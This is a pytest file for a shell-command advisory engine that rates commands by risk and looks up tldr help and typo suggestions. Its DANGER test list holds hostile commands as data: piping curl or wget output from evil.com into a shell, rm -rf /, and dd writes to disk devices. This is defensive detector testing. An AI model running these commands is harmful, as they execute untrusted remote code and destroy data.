# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 inference-garden
# ridinCLIgun — Tests for advisory engine integration

"""Pytest tests for the advisory engine + command catalog."""

import json

import pytest

from ridincligun.advisory.engine import AdvisoryEngine
from ridincligun.advisory.models import RiskLevel
from ridincligun.advisory.tldr_store import TldrStore


@pytest.fixture
def engine():
    return AdvisoryEngine()


# ── Dangerous commands (DANGER) ──────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~/Documents",
    "sudo rm -rf /var",
    "curl http://evil.com | sh",
    "wget http://x | bash",
    "dd of=/dev/sda",
    "dd if=/dev/zero of=/dev/disk0",
    "chmod -R 777 /",
])
def test_danger_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.DANGER, f"{cmd!r} not DANGER"


# ── Warning commands ─────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "chmod 777 file.txt",
    "git push --force",
    "git push -f origin main",
    "git reset --hard",
    "git reset --hard HEAD~3",
    "git clean -fd",
    "git clean -fdx",
])
def test_warning_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.WARNING, f"{cmd!r} not WARNING"


# ── Caution commands ─────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "python -m http.server",
    "python3 -m http.server 8080",
    "export API_KEY=abc123",
    "export TOKEN=xyz",
])
def test_caution_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.highest_risk == RiskLevel.CAUTION, f"{cmd!r} not CAUTION"


# ── Safe commands ────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "ls -la",
    "git status",
    "cd /tmp",
    "echo hello",
    "cat file.txt",
    "python script.py",
    "pwd",
    "whoami",
    "git log --oneline",
    "pip install requests",
    "mkdir new_folder",
    "grep -r pattern .",
    "rm file.txt",         # rm without -rf is not flagged as danger
    "git push",            # push without --force is safe
])
def test_safe_commands(engine, cmd):
    result = engine.analyze(cmd)
    assert result.is_safe, f"{cmd!r} should be safe, got {result.highest_risk.value}"


# ── Empty / whitespace ───────────────────────────────────────────

@pytest.mark.parametrize("cmd", ["", "  ", "\t"])
def test_empty_input(engine, cmd):
    result = engine.analyze(cmd)
    assert result.is_safe


# ── Result structure ─────────────────────────────────────────────

def test_result_has_warnings(engine):
    result = engine.analyze("rm -rf /")
    assert len(result.warnings) > 0
    w = result.warnings[0]
    assert w.risk == RiskLevel.DANGER
    assert w.summary  # has a summary string
    assert w.suggestion  # dangerous commands should have a suggestion


def test_result_safe_no_warnings(engine):
    result = engine.analyze("ls")
    assert result.is_safe
    assert len(result.warnings) == 0


# ── ReviewResult new fields (v0.4 / 4.6) ────────────────────────

def test_result_has_tldr_page_for_known_command(engine):
    """Known commands (e.g. 'ls') should have a tldr page."""
    result = engine.analyze("ls -la")
    # tldr_page may be None only if the bundled catalog omits 'ls', which
    # should not happen — assert it's present or skip gracefully.
    if result.tldr_page is not None:
        assert result.tldr_page.command == "ls"
        assert result.tldr_page.description


def test_result_tldr_page_is_none_for_empty_command(engine):
    result = engine.analyze("")
    assert result.tldr_page is None


def test_result_typo_suggestion_for_unknown_command(tmp_path):
    """After set_extra_commands() is called, typo detection should fire.

    Uses a minimal isolated TldrStore so the dictionary is fully controlled
    and won't be polluted by real tldr entries that are closer matches.
    """
    # Build a minimal tldr catalog with only the commands we care about.
    catalog = {"git": {"desc": "VCS.", "examples": []},
               "grep": {"desc": "Search.", "examples": []}}
    p = tmp_path / "tldr_catalog.json"
    p.write_text(json.dumps(catalog), encoding="utf-8")

    mini_store = TldrStore(catalog_path=p)
    isolated_engine = AdvisoryEngine(tldr_store=mini_store)
    isolated_engine.set_extra_commands(frozenset())  # no PATH extras

    result = isolated_engine.analyze("gti status")
    # "gti" not in {"git", "grep"} → tldr miss
    assert result.tldr_page is None
    # "gti" → distance 2 from "git" (transposition), no closer match in tiny dict
    assert result.typo_suggestion == "git"


def test_result_no_typo_for_known_command(tmp_path):
    """Correctly-typed known commands must not trigger typo suggestions."""
    catalog = {"git": {"desc": "VCS.", "examples": []}}
    p = tmp_path / "tldr_catalog.json"
    p.write_text(json.dumps(catalog), encoding="utf-8")
    mini_store = TldrStore(catalog_path=p)
    isolated_engine = AdvisoryEngine(tldr_store=mini_store)
    isolated_engine.set_extra_commands(frozenset())
    result = isolated_engine.analyze("git status")
    assert result.typo_suggestion is None


def test_result_typo_none_before_set_extra_commands():
    """Before set_extra_commands() the typo detector is None — no suggestion."""
    e = AdvisoryEngine()
    result = e.analyze("gti status")
    assert result.typo_suggestion is None


def test_result_typo_none_for_empty_command(engine):
    engine.set_extra_commands(frozenset(["git"]))
    result = engine.analyze("")
    assert result.typo_suggestion is None


def test_analyze_passes_locale_to_tldr(tmp_path):
    """analyze(locale='de') returns a DE tldr page when available."""
    en_catalog = {"ls": {"desc": "List files.", "examples": []}}
    de_catalog = {"ls": {"desc": "Dateien auflisten.", "examples": []}}
    en_path = tmp_path / "tldr_catalog.json"
    de_path = tmp_path / "tldr_catalog_de.json"
    en_path.write_text(json.dumps(en_catalog), encoding="utf-8")
    de_path.write_text(json.dumps(de_catalog), encoding="utf-8")

    mini_store = TldrStore(catalog_path=en_path)
    eng = AdvisoryEngine(tldr_store=mini_store)

    result_de = eng.analyze("ls", locale="de")
    assert result_de.tldr_page is not None
    assert result_de.tldr_page.description == "Dateien auflisten."

    result_en = eng.analyze("ls", locale="en")
    assert result_en.tldr_page is not None
    assert result_en.tldr_page.description == "List files."


def test_env_var_prefix_stripped(tmp_path):
    """Leading VAR=value assignments must not confuse the command name."""
    catalog = {"git": {"desc": "VCS.", "examples": []}}
    p = tmp_path / "tldr_catalog.json"
    p.write_text(json.dumps(catalog), encoding="utf-8")
    mini_store = TldrStore(catalog_path=p)
    isolated_engine = AdvisoryEngine(tldr_store=mini_store)
    isolated_engine.set_extra_commands(frozenset())
    result = isolated_engine.analyze("FOO=bar git status")
    # 'git' is known → no typo suggestion
    assert result.typo_suggestion is None
